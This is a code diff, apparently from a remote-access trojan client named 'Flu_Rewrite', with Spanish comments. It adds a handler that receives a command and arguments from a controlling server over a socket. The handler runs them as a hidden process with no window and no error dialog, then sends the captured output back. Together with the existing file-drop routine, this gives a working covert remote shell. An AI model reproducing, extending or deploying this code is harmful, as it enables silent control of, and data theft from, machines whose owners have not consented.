@@ -55,7 +55,14 @@ namespace Flu_Rewrite
                         try { RecibirArchivo(); Cliente.Client.Send(Encoding.ASCII.GetBytes("OK")); }
                         catch (Exception ex) { Cliente.Client.Send(Encoding.ASCII.GetBytes("Error" + ex.Message)); }
                         break;
+                    case "Comando Interno":
+                        EjecutarComandoInterno();
+                        break;
+                    case "Comando Externo":
+                        EjecutarComando();
+                        break;
                 }
+                Buffer = new Byte[2048];
             }
         }
 
@@ -75,7 +82,7 @@ namespace Flu_Rewrite
             String Retorno = "";
             Type Comandos = typeof(ComandosInternos);
             MethodInfo[] Metodos = Comandos.GetMethods();
-            foreach (MethodInfo Metodo in Metodos) Retorno += Metodo.Name + " ?";
+            foreach (MethodInfo Metodo in Metodos) Retorno += Metodo.Name + " ||";
             return Retorno;
         }
 
@@ -86,6 +93,45 @@ namespace Flu_Rewrite
             Cliente.Client.Receive(Nombre);
             Cliente.Client.Receive(Archivo);
             File.WriteAllBytes(Encoding.ASCII.GetString(Nombre), Archivo);
+        }
+
+        public void EjecutarComando()
+        {
+            try
+            {
+                Byte[] Comando = new Byte[2048];
+                Byte[] Argumentos = new Byte[2048];
+                Cliente.Client.Receive(Comando);
+                Cliente.Client.Receive(Argumentos);
+                //No necesitamos mas argumentos. Esto deberia ser el trabajo del plugin en el servidor
+                Cliente.Client.Send(Encoding.ASCII.GetBytes("Interrumpir"));
+                String SComando = Encoding.ASCII.GetString(Comando);
+                String SArgumentos = Encoding.ASCII.GetString(Argumentos);
+                ProcessStartInfo PSI = new ProcessStartInfo(SComando, SArgumentos);
+                //No queremos que se inicie ninguna ventana, aunque en una proxima version se hara configurable
+                PSI.CreateNoWindow = true;
+                //Si falla no haga nada
+                PSI.ErrorDialog = false;
+                //NEcesitamos devolver lo que devuelva el programa
+                PSI.RedirectStandardOutput = true;
+                //???
+                PSI.UseShellExecute = false;
+                //Iniciar el proceso
+                Process Proceso = Process.Start(PSI);
+                //Obtener su salida estandar
+                StreamReader Salida = Proceso.StandardOutput;
+                String Resultado = Salida.ReadToEnd();
+                //Es necesario liberar este Stream, aunque tambien podria hacerlo el Garbahe Collector :p
+                Salida.Close();
+                //Enviamos lo que salga del comando al servidor
+                Cliente.Client.Send(Encoding.ASCII.GetBytes(Resultado));
+            }
+            catch (Exception e) { Cliente.Client.Send(Encoding.ASCII.GetBytes("ERROR: " + e.Message)); }
+        }
+
+        public void EjecutarComandoInterno()
+        {
+
         }
     }
 }
